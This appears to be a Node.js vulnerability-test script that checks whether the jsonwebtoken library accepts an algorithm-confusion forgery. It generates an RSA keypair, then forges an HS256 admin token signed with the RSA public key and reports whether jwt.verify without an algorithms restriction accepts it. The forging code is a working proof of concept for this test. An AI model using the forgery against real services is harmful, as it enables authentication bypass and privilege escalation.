'use strict';
const jwt = require('jsonwebtoken');
const crypto = require('crypto');
const path = require('path');
const os = require('os');

function finish(obj) {
  console.log('ORACLE_RESULT ' + JSON.stringify(obj));
}

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

try {
  const marker = 'jwt_oracle_' + Date.now() + '_' + Math.random().toString(36).slice(2);

  // Generate an RSA keypair to simulate a server that signs with RS256
  // and whose public key is used for verification.
  const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
    modulusLength: 2048,
    publicKeyEncoding: { type: 'spki', format: 'pem' },
    privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
  });

  // --- Benign operation: sign and verify a token with RS256 explicitly ---
  const payload = { marker, user: 'alice', role: 'user' };
  const legitToken = jwt.sign(payload, privateKey, { algorithm: 'RS256' });

  const verifiedBenign = jwt.verify(legitToken, publicKey, { algorithms: ['RS256'] });

  if (!verifiedBenign || verifiedBenign.marker !== marker || verifiedBenign.role !== 'user') {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'Benign RS256 sign/verify did not produce expected payload' });
    process.exit(0);
  }

  // Benign operation succeeded.
  operation_completed = true;

  // --- Malicious operation: algorithm confusion attack ---
  // Attacker crafts an HS256 token, using the server's RSA *public key*
  // (which is routinely exposed, e.g. embedded in client code or an
  // openly served JWKS/public key file) as the HMAC secret.
  // If jwt.verify() is called without restricting `algorithms`, and the
  // vulnerable library defaults to accepting whatever algorithm is in
  // the token header, the HS256 signature will validate successfully
  // against the RSA public key string, forging a trusted token.
  const forgedPayload = { marker, user: 'attacker', role: 'admin' };
  const forgedToken = jwt.sign(forgedPayload, publicKey, { algorithm: 'HS256' });

  let forgedVerified = null;
  let blocked = false;
  try {
    // Victim code calls verify with only the public key and no explicit
    // algorithms restriction - the historically insecure default pattern.
    forgedVerified = jwt.verify(forgedToken, publicKey);
  } catch (err) {
    blocked = true;
    evidence = 'Malicious HS256-forged token (signed using RSA public key as HMAC secret) was rejected: ' + err.message;
  }

  if (!blocked && forgedVerified && forgedVerified.marker === marker && forgedVerified.role === 'admin') {
    exploit_succeeded = true;
    evidence = 'Algorithm confusion succeeded: HS256 token forged with RSA public key as HMAC secret was accepted by jwt.verify(), granting role=' + forgedVerified.role;
  } else if (!blocked) {
    exploit_succeeded = false;
    evidence = 'Forged token was not accepted but no exception was thrown; unexpected result: ' + JSON.stringify(forgedVerified);
  }

  finish({ operation_completed, exploit_succeeded, evidence });
} catch (err) {
  // Any unexpected exception before/during benign op or unrelated failure
  finish({ operation_completed: false, exploit_succeeded: false, evidence: 'Unexpected exception: ' + (err && err.message ? err.message : String(err)) });
}
